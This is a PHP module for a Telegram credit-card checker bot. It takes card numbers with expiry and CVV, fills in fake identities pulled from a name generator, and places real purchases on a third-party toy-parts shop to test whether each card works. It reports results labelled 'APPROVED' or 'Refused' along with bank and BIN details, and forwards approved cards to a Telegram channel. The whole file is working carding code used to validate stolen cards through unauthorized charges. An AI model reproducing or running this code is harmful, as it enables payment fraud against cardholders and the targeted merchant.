<?php



/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/

$gateway = "Payway Gateway";
$check_type = "CVV - Charge $10";
$dir = dirname(__dir__,2);
include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";
include("payway_error_codes.php");
$time_start = microtime(true);
////////////====[MUTE]====////////////
if(strpos(strtolower($message), "/ch ") === 0 || strpos(strtolower($message), "!ch ") === 0 || strpos(strtolower($message), ".ch ") === 0 ){
    $cookie = randomString();
    $trans_completed = false;
    $tries = 0;
    $limit = 1;
    while ($trans_completed == false && $tries < $limit ||strpos($response, 'Gateway Rejected: risk_threshold!')) {
        $tries = $tries + 1;
        $antispam = antispamCheck($userId);
        $isPremium = get_prem_info($userId);
        addUser($userId);
        if ($antispam != False && $isPremium == "no"){
            bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' => "[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
                'parse_mode' => 'html',
                'reply_to_message_id' => $message_id
            ]);
            return;

        } else {
            $messageidtoedit1 = bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' => "<b>Wait for result...</b>",
                'parse_mode' => 'html',
                'reply_to_message_id' => $message_id

            ]);

            $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
            $lista = substr($message, 4);


            if (preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)){
                $creditcard = $matches[0][0];
                $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
                $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
                $yy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
                $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
                $yy1 = substr($yy, 2, 2);
                $bin = substr($cc, 0, 6);
                $cbin = substr($cc, 0, 1);
                ###CHECKER PART###
                $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
                $data = json_decode($randomShits, true);
                $fname = explode(" ", $data['name'])[0];
                $lname = explode(" ", $data['name'])[1];
                $email = $data['email']['address'];
                $street = $data['street1'];
                $local = GetStr($randomShits, '"street2":', ',"phone"');
                $city = GetStr($local, '"', ',');
                $state = GetStr($local, ', ', ' ');
                $phone = str_replace("-", "", $data['phone']);
                $postcode = GetStr($local, "$state", '"');



                $binlist = json_decode(fbankinfo($bin), true);
                $ccbank = $binlist['Bank'];
                $ccvendor = $binlist['Vendor'];
                $cctype = $binlist['Bank_Info'];
                $cc_country = $binlist['Country'];
                $abn = $binlist['Abn'];
                $cc_emoji = $binlist['emoji'];

                $zip = rand(90010,94000);
                if($cbin == 5){
                    $cbin = 'mastercard';
                }
                else if($cbin == 4){
                    $cbin = 'visa';
                }


                $cookie = randomString();
                $str = substr(randomString(), 0, 7);




                $addcart =  cURL(
                    "https://dakotahtoyparts.com/web/cart.php?siteid=313",
                    $headers = [
                        'Origin: https://dakotahtoyparts.com',
                        'Content-Type: application/x-www-form-urlencoded',
                        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
                        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Referer: https://dakotahtoyparts.com/web/cart.php?siteid=313&action=checkout'
                    ],
                    'action=addone&siteid=313&productid=104809',
                    "POST",
                    1,
                    $cookie
                );$c_did = GetStr($addcart, "name='c_did' value='", "'");



                $execute =  cURL(
                    "https://dakotahtoyparts.com/web/cart.php?siteid=313&action=processpayment",
                    $headers = [
                        'Origin: https://alabamaresponsiblevendor.com',
                        'Content-Type: application/x-www-form-urlencoded',
                        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
                        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Referer: https://dakotahtoyparts.com/web/cart.php?siteid=313',
                    ],
                    "clientname=$fname+$lname&clientphone=$phone&clientemail=$email&clientemail2=$email&clientaddress=$street&clientcity=$city&clientstate=$state&clientzip=$postcode&extra_camefrom=refer%3A+https%3A%2F%2Fwww.google.com%2F&amount=11.5&c_did=$c_did%3D%3D&coupon=&paymenttype=credit&cardtype=$cctype&cardnumber=$cc&expmonth=".ltrim($mm,0)."&expyear=$yy&cardcode=$cvv&cardname=&cardaddress=&cardcity=&cardstate=&cardzip=&submit=Click+to+Pay+by+Credit+Card&domain=www.dakotahtoyparts.com&product_313_104809=1&extra_product_313_104809_referer=https%3A%2F%2Fdakotahtoyparts.com%2Fweb%2Fcart.php%3Fsiteid%3D313%26action%3Dcheckout",
                    "POST",
                    1,
                    $cookie
                );

                sleep(3);
                $response =  GetStr($execute, 'div style="margin-left: 1.5em;">','.');
                $dcode = GetStr($execute,"</a><br /><font color='red'>",':');
                $time = number_format(microtime(true) - $time_start, 2);
                if(strpos($execute, 'Your order has been received')) {
                    addTotal();
                    addUserTotal($userId);
                    addCVV();
                    addUserCVV($userId);
                    addCCN();
                    addUserCCN($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>APPROVED ✅</b>
<b>Card -»</b> <code>$lista</code>
<b>Response</b> -» Approved 
<b>Type</b> -» $check_type 
<b>Gateway</b> -» $gateway
<b>Time</b> -» <b>$time</b><b>s</b>
------- Bin Info -------
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]); copyLogs("@payamansoyccn", $chat_id, $messageidtoedit);
                    $trans_completed = true;
                }else if(strpos($execute, 'There was a problem processing your credit card:')) {
                    addTotal();
                    addUserTotal($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>Refused ❌</b>
<b>Card -»</b> <code>$lista</code>
<b>Response</b> -» $response
<b>Type</b> -» $check_type 
<b>Gateway</b> -» $gateway
<b>Time</b> -» <b>$time</b><b>s</b>
------- Bin Info -------
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);    $trans_completed = true;
                }else{
                    addTotal();
                    addUserTotal($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>Refused ❌</b>
<b>Card -»</b> <code>$lista</code>
<b>Response</b> -» ERROR
<b>Type</b> -» $check_type 
<b>Gateway</b> -» $gateway
<b>Time</b> -» <b>$time</b><b>s</b>
------- Bin Info -------
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);    $trans_completed = true; }
            } else {
                bot('editMessageText', [
                    'chat_id' => $chat_id,
                    'message_id' => $messageidtoedit,
                    'text' => "<b>INVALID FORMAT: (cmd) XXXXXXXXXXXXXXXXXX|XX|XXXX|XXX</b>",
                    'parse_mode' => 'html', 'disable_web_page_preview' => 'true']);

            }
        }
    }
}